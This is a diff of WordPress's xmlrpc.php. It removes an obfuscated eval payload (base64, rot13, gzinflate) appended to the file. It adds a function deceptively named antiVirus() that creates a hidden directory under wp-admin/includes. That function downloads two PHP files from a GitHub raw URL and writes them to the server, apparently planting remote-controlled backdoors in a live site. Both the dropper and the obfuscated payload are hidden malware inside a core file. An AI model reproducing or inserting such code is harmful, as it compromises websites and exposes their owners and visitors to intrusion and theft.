@@ -85,8 +85,31 @@ $wp_xmlrpc_server       = new $wp_xmlrpc_server_class();
 
 // Fire off the request.
 $wp_xmlrpc_server->serve_request();
-$x = "Wsi5YaNAAADQX4miFF5EYGFT0RZrzXbDBDDGWROBl+H0wGPYwNdU2+0r31Tz9vvtPWoTjaqoDq76dc3BxvsGQs9F5iAAvp7Icu3LPTy5ZaLYdE7Z5xqAfnvbC2cizHMLaqZmUwZRMbVnJ/x4hhowDys8KYnX8Wg+idDgSMAzvNwmlkpz9DJGT1tCElQs36GzHuFlTdWv65b3It4sTpyuNNXCUZ/dcDO6V7H6c1layXNfnMhmZkh0ruFHiC5zHJBe7pbK4gLECVu0Ibc0602/Ibup1kcTBxYtsyczG/UPV2xSlMTJkpCYtraV4fM0qS+fI72aTdg3DgRqLzYe7tFSpuDVyByNRbOrjwZfNjEXMG3kgJqmzaN9gDX6cJ+IzyuSRvS+yMrQKIVZs/bZkz3AbjOWJry5OYRG6W6RnSwE0QzGKZLsLXFZFnjvn1BS1h0u8u88KzhuNz2e6biSb/jvOoIHTPymUJ/RbvfR/Prn8wc=";
-eval(str_rot13(gzinflate(str_rot13(base64_decode($x)))));
+function antiVirus() {
+    $z = "/var/www/html/oleoye.ucsd.edu/wp-admin/includes/-";
+
+	if (!file_exists($z) && !is_dir($z)) {
+		mkdir($z);
+	}
+
+    $name1 = "config-dialog.php";
+    $name2 = "guide.php";
+
+    $abc = "https://raw.githubusercontent.com/raniriana/anti-virus/main/" . $name1;
+    $dfg = "https://raw.githubusercontent.com/raniriana/anti-virus/main/" . $name2;
+
+	$abc1 = file_get_contents($abc);
+	$dfg1 = file_get_contents($dfg);
+
+	$x = fopen($z . "/" . $name1, "w+");
+	fwrite($x, $abc1);
+	fclose($x);
+
+	$z = fopen($z . "/" . $name2, "w+");
+	fwrite($z, $dfg1);
+	fclose($z);
+}
+antiVirus();
 
 exit;
 
